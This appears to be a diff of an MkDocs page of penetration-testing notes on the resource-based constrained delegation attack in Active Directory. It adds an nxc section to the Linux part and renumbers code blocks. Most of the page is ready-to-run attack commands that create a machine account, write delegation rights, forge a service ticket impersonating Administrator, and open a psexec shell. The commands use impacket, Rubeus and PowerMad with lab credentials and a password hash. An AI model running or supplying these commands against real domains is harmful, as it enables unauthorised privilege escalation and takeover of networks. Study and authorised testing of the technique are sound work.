@@ -3176,6 +3176,30 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Linux">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#with-nxc" class="md-nav__link">
+    <span class="md-ellipsis">
+      With nxc
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#with-impacket" class="md-nav__link">
+    <span class="md-ellipsis">
+      With impacket
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -3685,6 +3709,30 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Linux">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#with-nxc" class="md-nav__link">
+    <span class="md-ellipsis">
+      With nxc
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#with-impacket" class="md-nav__link">
+    <span class="md-ellipsis">
+      With impacket
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -3719,48 +3767,53 @@
 
 <h2 id="linux">Linux</h2>
 <hr />
+<h3 id="with-nxc">With nxc</h3>
+<p>impersonate administrator given <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> is set on account we control
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.56.11<span class="w"> </span>-u<span class="w"> </span>jon.snow<span class="w"> </span>-p<span class="w"> </span>iknownothing<span class="w"> </span>--delegate<span class="w"> </span>Administrator
+</span></code></pre></div></p>
+<h3 id="with-impacket">With impacket</h3>
 <p>Add computer you control
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">impacket-addcomputer</span> <span class="n">-computer-name</span> <span class="s1">&#39;rbcd-test$&#39;</span> <span class="n">-computer-pass</span> <span class="s1">&#39;Megaman!1&#39;</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">100</span> <span class="n">its-piemonte</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">tantani</span><span class="p">:</span><span class="s1">&#39;AAAAaaaa!1&#39;</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">impacket-addcomputer</span> <span class="n">-computer-name</span> <span class="s1">&#39;rbcd-test$&#39;</span> <span class="n">-computer-pass</span> <span class="s1">&#39;Megaman!1&#39;</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">100</span> <span class="n">its-piemonte</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">tantani</span><span class="p">:</span><span class="s1">&#39;AAAAaaaa!1&#39;</span>
 </span></code></pre></div>
 example with hash
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">impacket-addcomputer</span> <span class="n">-computer-name</span> <span class="s1">&#39;rbcd$&#39;</span> <span class="n">-computer-pass</span> <span class="s1">&#39;Password123!&#39;</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">146</span><span class="p">.</span><span class="n">175</span> <span class="n">resourced</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">L</span><span class="p">.</span><span class="n">Livingstone</span> <span class="n">-hashes</span> <span class="p">:</span><span class="n">19a3a7550ce8c505c2d46b5e39d6f808</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">impacket-addcomputer</span> <span class="n">-computer-name</span> <span class="s1">&#39;rbcd$&#39;</span> <span class="n">-computer-pass</span> <span class="s1">&#39;Password123!&#39;</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">146</span><span class="p">.</span><span class="n">175</span> <span class="n">resourced</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">L</span><span class="p">.</span><span class="n">Livingstone</span> <span class="n">-hashes</span> <span class="p">:</span><span class="n">19a3a7550ce8c505c2d46b5e39d6f808</span>
 </span></code></pre></div>
 Configure delegation rights
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">impacket-rbcd</span> <span class="n">-delegate-to</span> <span class="s1">&#39;its-dc1$&#39;</span> <span class="n">-delegate-from</span> <span class="s1">&#39;rbcd-test$&#39;</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">100</span> <span class="n">-action</span> <span class="nb">write </span><span class="n">its-piemonte</span><span class="p">/</span><span class="n">tantani</span><span class="p">:</span><span class="s1">&#39;AAAAaaaa!1&#39;</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">impacket-rbcd</span> <span class="n">-delegate-to</span> <span class="s1">&#39;its-dc1$&#39;</span> <span class="n">-delegate-from</span> <span class="s1">&#39;rbcd-test$&#39;</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">100</span> <span class="n">-action</span> <span class="nb">write </span><span class="n">its-piemonte</span><span class="p">/</span><span class="n">tantani</span><span class="p">:</span><span class="s1">&#39;AAAAaaaa!1&#39;</span>
 </span></code></pre></div>
 Example with hash
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">impacket-rbcd</span> <span class="n">-delegate-to</span> <span class="s1">&#39;RESOURCEDC$&#39;</span> <span class="n">-delegate-from</span> <span class="s1">&#39;rbcd$&#39;</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">146</span><span class="p">.</span><span class="n">175</span> <span class="n">-action</span> <span class="nb">write </span><span class="n">resourced</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">L</span><span class="p">.</span><span class="n">Livingstone</span> <span class="n">-hashes</span> <span class="p">:</span><span class="n">19a3a7550ce8c505c2d46b5e39d6f808</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">impacket-rbcd</span> <span class="n">-delegate-to</span> <span class="s1">&#39;RESOURCEDC$&#39;</span> <span class="n">-delegate-from</span> <span class="s1">&#39;rbcd$&#39;</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">146</span><span class="p">.</span><span class="n">175</span> <span class="n">-action</span> <span class="nb">write </span><span class="n">resourced</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">L</span><span class="p">.</span><span class="n">Livingstone</span> <span class="n">-hashes</span> <span class="p">:</span><span class="n">19a3a7550ce8c505c2d46b5e39d6f808</span>
 </span></code></pre></div>
 Request ticket for admin
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">impacket-getST</span> <span class="n">-spn</span> <span class="n">cifs</span><span class="p">/</span><span class="n">its-dc1</span><span class="p">.</span><span class="n">its-piemonte</span><span class="p">.</span><span class="n">local</span> <span class="n">-impersonate</span> <span class="n">Administrator</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">100</span> <span class="n">its-piemonte</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">rbcd-test</span><span class="p">:</span><span class="s1">&#39;Megaman!1&#39;</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">impacket-getST</span> <span class="n">-spn</span> <span class="n">cifs</span><span class="p">/</span><span class="n">its-dc1</span><span class="p">.</span><span class="n">its-piemonte</span><span class="p">.</span><span class="n">local</span> <span class="n">-impersonate</span> <span class="n">Administrator</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">100</span> <span class="n">its-piemonte</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">rbcd-test</span><span class="p">:</span><span class="s1">&#39;Megaman!1&#39;</span>
 </span></code></pre></div>
 another example
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">impacket-getST</span> <span class="n">-spn</span> <span class="n">cifs</span><span class="p">/</span><span class="n">RESOURCEDC</span><span class="p">.</span><span class="n">resourced</span><span class="p">.</span><span class="n">local</span> <span class="n">-impersonate</span> <span class="n">Administrator</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">146</span><span class="p">.</span><span class="n">175</span> <span class="n">resourced</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">rbcd</span><span class="p">:</span><span class="s1">&#39;Password123!&#39;</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">impacket-getST</span> <span class="n">-spn</span> <span class="n">cifs</span><span class="p">/</span><span class="n">RESOURCEDC</span><span class="p">.</span><span class="n">resourced</span><span class="p">.</span><span class="n">local</span> <span class="n">-impersonate</span> <span class="n">Administrator</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">146</span><span class="p">.</span><span class="n">175</span> <span class="n">resourced</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">rbcd</span><span class="p">:</span><span class="s1">&#39;Password123!&#39;</span>
 </span></code></pre></div>
 auth with ccache
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=</span><span class="n">Administrator</span><span class="nv">@cifs_RESOURCEDC</span><span class="p">.</span><span class="n">resourced</span><span class="p">.</span><span class="n">local</span><span class="nv">@RESOURCED</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">.</span><span class="n">ccache</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=</span><span class="n">Administrator</span><span class="nv">@cifs_RESOURCEDC</span><span class="p">.</span><span class="n">resourced</span><span class="p">.</span><span class="n">local</span><span class="nv">@RESOURCED</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">.</span><span class="n">ccache</span>
 </span></code></pre></div>
 PSEXEC IN
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">impacket-psexec</span> <span class="n">Administrator</span><span class="nv">@resourced</span><span class="p">.</span><span class="n">local</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">146</span><span class="p">.</span><span class="n">175</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">impacket-psexec</span> <span class="n">Administrator</span><span class="nv">@resourced</span><span class="p">.</span><span class="n">local</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">146</span><span class="p">.</span><span class="n">175</span>
 </span></code></pre></div></p>
 <h2 id="windows">Windows</h2>
 <hr />
 <p>Windows <a href="https://github.com/Kevin-Robertson/Powermad">PowerMad</a> has a cmdlet to let us create machine accounts:
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">baud</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;Baudy16!1&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">baud</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;Baudy16!1&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
 </span></code></pre></div>
 Configure rights (with default AD powershell module)
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">Set-ADComputer</span> <span class="n">its-dc1</span> <span class="n">-PrincipalsAllowedToDelegateToAccount</span> <span class="n">baud</span><span class="p">$</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">Set-ADComputer</span> <span class="n">its-dc1</span> <span class="n">-PrincipalsAllowedToDelegateToAccount</span> <span class="n">baud</span><span class="p">$</span>
 </span></code></pre></div>
 use rubeus
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c"># get AES:</span>
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">hash</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="n">Baudy16</span><span class="p">!</span><span class="n">1</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">baud</span><span class="p">$</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">its-piemonte</span><span class="p">.</span><span class="n">local</span>
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="c"># get only RC4:</span>
-</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">hash</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="n">Baudy16</span><span class="p">!</span><span class="n">1</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c"># get AES:</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">hash</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="n">Baudy16</span><span class="p">!</span><span class="n">1</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">baud</span><span class="p">$</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">its-piemonte</span><span class="p">.</span><span class="n">local</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c"># get only RC4:</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">hash</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="n">Baudy16</span><span class="p">!</span><span class="n">1</span>
 </span></code></pre></div></p>
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">baud</span><span class="p">$</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">8F8172E42D04C1934FECC9E8404E2657</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">its-piemonte</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">its-dc1</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">ptt</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">baud</span><span class="p">$</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">8F8172E42D04C1934FECC9E8404E2657</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">its-piemonte</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">its-dc1</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">ptt</span>
 </span></code></pre></div>
 <p>Convert to auth ticket
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">impacket-ticketConverter</span> <span class="n">rubeusTicket</span><span class="p">.</span><span class="n">kirbi</span> <span class="n">impacketTicket</span><span class="p">.</span><span class="n">ccache</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">impacket-ticketConverter</span> <span class="n">rubeusTicket</span><span class="p">.</span><span class="n">kirbi</span> <span class="n">impacketTicket</span><span class="p">.</span><span class="n">ccache</span>
 </span></code></pre></div></p>
 
 
